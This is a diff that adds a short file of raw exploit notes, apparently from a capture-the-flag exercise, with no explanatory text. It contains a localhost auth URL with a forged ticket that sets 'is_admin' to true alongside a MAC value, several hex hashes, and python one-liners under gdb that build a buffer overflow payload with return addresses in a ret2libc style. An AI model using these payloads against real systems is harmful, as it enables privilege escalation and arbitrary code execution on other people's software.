@@ -1,0 +1,13 @@
+http://127.0.0.1/auth.php?ticket={%22username%22:%22shis%22,%22is_admin%22:%22true%22,%22expired%22:%222022-01-31%22}&mac=99d59909b5658b0cfa051c3245e7ceef
+
+9986bed60469861fea56ee178dfe88cf
+99c847dc21362f3f6000000000000000
+
+99c847dc21362fae6f92b932567c93df
+
+`python -c 'print "a"*4128+"\x60\x21\xe4\xb7"'`
+
+(gdb) r -f `python -c 'print "a"*4128+"\x60\x21\xe4\xb7"+"\x90\x5c\xe3\xb7"+""'` 
+
+r -f `python -c 'print "a"*4128+"\x60\x21\xe4\xb7"+"\x80\xd1\x04\x08"+"\xb9\xf3\xff\xbf"'`
+
